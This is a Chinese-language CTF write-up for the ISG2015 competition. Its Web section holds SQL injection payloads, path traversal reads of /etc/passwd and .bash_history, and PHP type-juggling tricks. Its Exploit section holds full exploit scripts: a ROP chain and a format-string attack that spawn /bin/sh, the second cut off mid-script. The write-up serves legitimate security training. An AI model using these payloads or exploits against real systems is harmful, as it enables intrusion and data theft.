<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>ISG2015 Writeup - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="Misc" />
<meta name="keywords" content="collision,Crypto,flagfinder,FlappyPig,Fruit Store,gettext_underbuilding,Image Database,ISG{256bit_is_weak},ISG{I_am_A_sW337_F14g},ISG{whatAb0uTacupoFte4},ISG2015 Writeup,rsatools,tell_me_who_u_are,webdroid" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/39058.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-39058 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive">独家</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup" rel="category tag">CTF</a> &gt;  正文 </nav><article id="post-39058" class="post-39058 post type-post status-publish format-standard has-post-thumbnail hentry category-ctf-writeup tag-collision tag-crypto tag-flagfinder tag-flappypig tag-fruit-store tag-gettext_underbuilding tag-image-database tag-isg256bit_is_weak tag-isgi_am_a_sw337_f14g tag-isgwhatab0utacupofte4 tag-isg2015-writeup tag-rsatools tag-tell_me_who_u_are tag-webdroid">
	<header class="single-header">
		<h1>ISG2015 Writeup</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /10/25 21:18</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">5,123</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/39058.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<h2><strong>Misc</strong></h2>
<h3>Welcome to ISG 2015 (50)</h3>
<p>直接在网页源码中找到,em标签替换为下划线即可。</p>
<p>ISG{I&lt;em&gt;am&lt;/em&gt;A&lt;em&gt;sW337&lt;/em&gt;F14g}</p>
<p>ISG{I_am_A_sW337_F14g}</p>
<p>&nbsp;</p>
<h2>Web</h2>
<h3>collision (50)</h3>
<p>那串数字的开头是0e,那么我们只要找到同样0e开头的md5值即可。详见<a href="https://v2ex.com/t/188364" target="_blank">https://v2ex.com/t/188364</a>。由于php的特性,这两个进行比较的时候会变成0。</p>
<p>《<a href="http://www.secpulse.com/archives/38544.html" target="_blank" rel="bookmark">第六届西电信息安全大赛XDCTF2015 WriteUp</a>》里面第一题就是 可以参考一下</p>
<p>http://202.120.7.133:8888/collision.php?md5=aabg7XSs</p>
<p>ISG{not_OnlY_mD5_c0llisi0N_bUt_aLs0_proBl3m}</p>
<h3>array (150)</h3>
<p><span style="color: #ff6600;">在php版本5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1中数组下标为0x100000000的时候 会和数组下标为0的时候相等</span></p>
<p>所以构造array.php?user[4294967296]=admin&amp;user[1]=1445132760</p>
<p>后面的时间戳向后设置10秒左右,一直刷新就可以出flag了.</p>
<h3>webdroid (200)</h3>
<p>把apk反编译之后可以看到一段代码:</p>
<pre>new DefaultHttpClient();
HttpPost localHttpPost = new HttpPost("http://202.120.7.135:8888/html/api.php");
JSONObject localJSONObject = new JSONObject();
localJSONObject.put("secret", paramString);
localHttpPost.setEntity(new StringEntity(localJSONObject.toString()));
String str = EntityUtils.toString(new DefaultHttpClient().execute(localHttpPost).getEntity());
return str;
</pre>
<p>大概意思是将JSON数据{"secret":paramString}POST到那个链接</p>
<p>直接用burp发包修改Content-Type提交数据{"secret":0}</p>
<p>解码失败后是null</p>
<p>服务端估计又是用的弱类型判断 null==0</p>
<p>拿到flag</p>
<h3>Fruit Store (200)</h3>
<p>GBK注入 直接扔到sqlmap里就能跑</p>
<pre>sqlmap -u "
http://202.120.7.140:8888/try.php?fruit=flag%df*"
</pre>
<p>跑出来之后数据库是store表是tell_me_who_u_are --dump一下就出flag了</p>
<h3>Image Database (200)</h3>
<p>提交../../../../../../../etc/passwd可以读到用户主目录是/home/isg</p>
<p>提交../../../../../../../home/isg/.bash_history可以知道/home/isg/web目录下有main.py</p>
<p><span style="color: #008000;">直接读读不了  所以读main.pyc</span></p>
<p>反编译字节码之后在代码里看到flag在secret/flag.txt也是不能直接读</p>
<p>看代码之后发现有get_image  get_text  secret_protect三个主要函数</p>
<p>get_image会将用户提交的数据base64加密后传给secret_protect</p>
<p>get_text会将用户提交的数据直接传给secret_protect</p>
<p>所以通过get_text可以直接绕过secret_protect的限制</p>
<p>get_text绑定的路由是/gettext_underbuilding</p>
<p>所以POST提交的时候用burp拦截下来把/getimg改成/gettext_underbuilding就可以获取flag了</p>
<h3>shell (250)</h3>
<p>能上传文件,文件名是 用户名.随机序列所以考虑注册一个.php结尾的用户</p>
<p>直接注册不了带非数字和非字母的用户名,检测之后发现邮箱的位置有注入所以想到在注册的时候直接额外添加一个.php结尾的用户</p>
<p>根据Web 350 Injection那道题的源码猜测本题的SQL插入语句也是</p>
<pre>$sql = "INSERT INTO users(username, password, email, ip) VALUES ('$username', '$password', '$email', '$ip')";
</pre>
<p>这种形式</p>
<p>所以构造payload:</p>
<pre>username=asdasd5cacc&amp;password=asdasdaccc&amp;email=sasad@qq.com','127.0.0.1'),('sbsun.php','f5de0b92fcff5f1fa67c503c04008278','6666@qq.com','127.0.0.1') %23
</pre>
<p>形成</p>
<pre>$sql = "INSERT INTO users ( username , password , email , ip) VALUES ( 'asdasd5cacc' , 'asdasdaccc','sasad@qq.com','127.0.0.1'),('sbsun.php','f5de0b92fcff5f1fa67c503c04008278','6666@qq.com','127.0.0.1') # ','$ip')";
</pre>
<p>来同时插入两个用户</p>
<p>然后用新注册的用户登录后上传文件并访问即可拿到flag.</p>
<h3>SuperAdmin (250)</h3>
<p>估计是注册的时候没有把用户名trim而登录时验证的是用户名trim后是否等于"admin" 所以注册的时候用户名注册为类似admin%20%0a这种,登录之后会被认为是admin登陆</p>
<p>登陆之后提示"你不是本机用户,不能看到调试信息"</p>
<p>登陆的时候把XFF头改成127.0.0.1就好了</p>
<p>看到一部分源码,源码具体内容没保存,忘了,就记得主要的是调用一个register函数,前几个参数是用户名,密码,IP,最后一个参数是$is_super</p>
<p>考虑可能存在变量覆盖漏洞</p>
<p>所以再注册一次用户并在url加上参数is_super=1然后注册登陆后即可看到flag</p>
<h3>injection (350)</h3>
<p>根据index.php.bak审计源码,</p>
<p>发现可能存在二次注入</p>
<p>search的时候用户名是从session中读取的,</p>
<p>session中的用户信息是在登陆或注册的时候存进去的,</p>
<p>fuzz了一下,发现可能存在内容截断,用户名在数据库中设置的长度是64</p>
<p>提交注册数据</p>
<pre>username=lingaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacd\&amp;password=asd&amp;email=asd%40qq.com
</pre>
<p>带入到$sql之后可以造成单引号逃逸,使得$title可以直接注入<br />
&lt;pre? $sql = "select * from posts where username='lingaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacd\' and title like '$title'";</p>
<p>登陆后可以直接用search=xxx进行手注也可以带着登陆后的cookie扔到sqlmap里跑,然后就能出flag了</p>
<h2>Crypto</h2>
<p>&nbsp;</p>
<h3>RSA (100)</h3>
<p>从使用openssl从pem文件中提取e,n,n为256bit,上rsatools直接破:</p>
<p><a href="http://p8.qhimg.com/t01a9777452d32ebcbb.png" target="_blank"><img title="t011dd848a3b367132e.png" src="http://p8.qhimg.com/t01a9777452d32ebcbb.png" alt="http://p0.qhimg.com/t011dd848a3b367132e.png" /></a></p>
<p>然后利用n求得d后直接解密enc文件即可:</p>
<pre>__author__ = 'bibi'
n=0xA41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7
e=65537
p=0xD7DB8F68BCEC6D7684B37201385D298B
q=0xC292A272E8339B145D9DF674B9A875D5
d=0x330228A0BBE9C119B6B9FEB34B673E6D9AAC3AD81409694B576871521254A2C1
r=open("flag.enc","rb")
re=r.read()
print re.encode("hex")
m=0x49b96edbe3961f58d529074bd893d6e036ceaf2b6d214b470fdc0d48723d6a40
c=pow(m,d,n)
print c
print(('0'+hex(c)[2:][:-1]).decode("hex"))
</pre>
<p><!--StartFragment --></p>
<p>ISG{256bit_is_weak}</p>
<h3>Alice(200)</h3>
<p>通过交互得知Alice在和Bob使用共享密钥算法Diffie-Hellman,这个题目本身并没有难点,主要是能够成功和Alice交互密钥即可。首先Alice向Bob提供了素数p和原根g,然后Alice自己产生了自己的私钥,并计算出公钥即key发送给Bob。我们作为Bob的模拟方,首先自己随便取一个私钥,然后根据素数p和原根g计算出公钥,发送给Alice,并通过Alice的公钥和我们的私钥计算出共享密钥K。Alice之后发送过来的密文即可以用K异或解密了。和Alice进行脑洞的对话后获取flag。注意密钥的长度不够,在flag传过来的时候,密钥倍长了一次。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/t0130f9c6ee9c350f85.jpg"><img class="alignnone size-full wp-image-39417" src="http://www.secpulse.com/wp-content/uploads/2015/10/t0130f9c6ee9c350f85.jpg" alt="t0130f9c6ee9c350f85" width="971" height="186" /></a></p>
<p>&nbsp;</p>
<pre>__author__ = 'bibi'
 from zio import *
 import time
 def convert_int(s):
     rs=s[::-1]
     r=0
     for i in rs:
         r=(r&lt;&lt;8)|(ord(i))
     return r
 def tentostr(k):
     temp=hex(k)
     t=str(temp)
     if t[-1]=='l' or t[-1]=='L':
         t=t[0:-1]
     r=t[2:]
     l=len(r)
     if l % 2 == 1:
         r='0'+r
     return r.decode("hex")
 def crypt(c,key):
     miyao=tentostr(key)
     miyao=miyao+miyao
     result=""
     for i in range(len(c)):
         result=result+chr(ord(c[i])^ord(miyao[i]))
     return result
 
 io=zio(("202.120.7.153",10002))
 text=io.read_until("Bob: KEY =")
 p=7434819441271677988772806904156413576519364203006754273683435665142647787269043488641
 g=3
 
 agkey=int(text.split("KEY = ")[1].split("\n")[0])
 bskey=123
 bgkey=pow(g,bskey,p)
 io.write(str(bgkey))
 
 K=pow(agkey,bskey,p)
 next=io.read_until("\nBob: ")
 text=next.split("Alice: ")[1].split("\n")[0].decode("base64")
 
 #print "################"+crypt(text,K)
 io.write(crypt("Alice",K).encode("base64"))
 text2=io.read_until("\n")
 time.sleep(1)
 m2=text2.split("e: ")[1].split("\n")[0].decode("base64")
 print crypt(m2,K)
 io.interact()
</pre>
<h2></h2>
<h2>Exploit</h2>
<h3>pwnme (100)</h3>
<p>逻辑非常简单:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/11.png"><img class="alignnone size-full wp-image-39418" src="http://www.secpulse.com/wp-content/uploads/2015/10/11.png" alt="1" width="322" height="133" /></a><a href="http://www.secpulse.com/wp-content/uploads/2015/10/21.png"><img class="alignnone size-full wp-image-39419" src="http://www.secpulse.com/wp-content/uploads/2015/10/21.png" alt="2" width="538" height="78" /></a></p>
<p>覆盖返回地址后,构造rop即可拿到shell,代码如下:</p>
<pre>__author__ = "pxx"
from zio import *
import struct
target = ("202.120.7.145", 9991)#"./pwnme"
def get_io(target):
         io = zio(target, timeout = 9999)
         return io
def full_buff(cur_data, length, ch_t = 'a'):
         len_t = length - len(cur_data)
         return cur_data + ch_t * len_t
def pwn(io):
         io.read_until("the flag:\n")
         io.gdb_hint()
         data = full_buff("a", 16)
         print "data len:", len(data)
         write_plt_addr = l32(0x08048370)
         read_plt_addr = l32(0x08048330)
         read_got_addr = 0x0804a00c
         write_got_addr = 0x0804a01c
         ebp_str = l32(0x01010101)
         p_ret = l32(0x08048311)
         pp_ret = l32(0x0804853e)
         ppp_ret = l32(0x0804853d)
         shellcode = write_plt_addr + ppp_ret + l32(0x1) + l32(write_got_addr) + l32(0x4)
         shellcode += read_plt_addr + ppp_ret + l32(0x0) + l32(write_got_addr) + l32(0x4)
         shellcode += read_plt_addr + ppp_ret + l32(0x0) + l32(read_got_addr) + l32(0x9)
         shellcode += write_plt_addr + p_ret + l32(read_got_addr)
         payload = data + ebp_str + shellcode
         io.write(payload + '\n')
         data = io.read(0x4)
         print len(data)
         write_real_addr = l32(data)
         print hex(write_real_addr)
         libc_addr = write_real_addr - 0x000dac50
         system_real_addr = libc_addr + 0x00040190
         binstr_real_addr = libc_addr + 0x160a24
         io.write(l32(system_real_addr))
         io.write("/bin/sh;\n")
         io.interact()
io = get_io(target)
pwn(io)
</pre>
<p>flag如下:</p>
<p><a href="http://p5.qhimg.com/t01c223395d8414acea.png" target="_blank"><img title="t01373ce68859a10c16.png" src="http://p5.qhimg.com/t01c223395d8414acea.png" alt="http://p9.qhimg.com/t01373ce68859a10c16.png" /></a></p>
<h3>echo (200)</h3>
<p>逻辑非常简单:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/31.png"><img class="alignnone size-full wp-image-39420" src="http://www.secpulse.com/wp-content/uploads/2015/10/31.png" alt="3" width="322" height="133" /></a></p>
<p>&nbsp;</p>
<p>属于格式化字符串漏洞,泄露地址后,用system将fgets的got表覆盖就可以拿到shell,开启了pie,泄露时还需要计算好got表的地址:</p>
<p><a href="http://p8.qhimg.com/t01504106e81dcf0357.png" target="_blank"><img title="t016e15c76d339d7168.png" src="http://p8.qhimg.com/t01504106e81dcf0357.png" alt="http://p3.qhimg.com/t016e15c76d339d7168.png" /></a></p>
<p>由于没有提供libc,直接与前面给出的地址作比较,猜想就是同一个libc,代码如下:</p>
<pre>__author__ = "pxx"
from zio import *
import struct
target = ("202.120.7.152", 9995)
#target = "./echo"
def get_io(target):
         io = zio(target, timeout = 9999)
         return io
def full_buff(cur_data, length, ch_t = 'a'):
         len_t = length - len(cur_data)
         return cur_data + ch_t * len_t
def generate_format_string(index, length):
         data = ""
         while True:
                   buff = "%%%d$p."%(index)
                   if len(data) + len(buff) &gt; length:
                            return data, index
                   data += buff
                   index += 1
def get_buff(io):
         index = 1
         times = 10
         total_buff = ""
         while times &gt; 0:
                   io.read_until("Your Message: ")
                   data, index = generate_format_string(index, 127 - 20)
                   times -= 1
                   io.write('a' * 20 + data + "\n")
                   data = io.read_until("\n").strip()
                   total_buff += data
         io.gdb_hint()
         io.interact()
def get_addr(io):
         index = 1
         times = 10
         total_buff = ""
         while times &gt; 0:
                   io.read_until("Your Message: ")
                   data, index = generate_format_string(index, 127)
                   times -= 1
                   io.write(data + "\n")
                   data = io.read_until("\n").strip()
                   total_buff += data
         io.gdb_hint()
         addr = int(raw_input("addr to compare:"), 16)
         for index, item in enumerate(total_buff.split('.')[:-1]):
                   if item == "(nil)":
                            continue
                   print index + 1, "-&gt;", item, ":", hex(int(item, 16) - addr)
         io.interact()
def pwn(io):
         io.read_until("Your Message: ")
         data = "%43$p.%51$p"
         io.write(data + "\n")
         data = io.read_until("\n").strip()
         data = data.split(".")
         libc_start_main = int(data[0], 16)
         fgets_got_addr = int(data[1], 16) - (0xf770c030 - 0xf770c018)
         #local
         #offset___libc_start_main_ret = 0x19a83
         #offset_system = 0x0003e800
         #offset_puts = 0x000656a0
         #offset_memset = 0x0007c680
         #remote
         offset___libc_start_main_ret = 0x19a83
         offset_system = 0x00040190
         libc_addr = libc_start_main - offset___libc_start_main_ret
         system_real_addr = libc_addr + offset_system
         text_addr = fgets_got_addr - 0x00002018
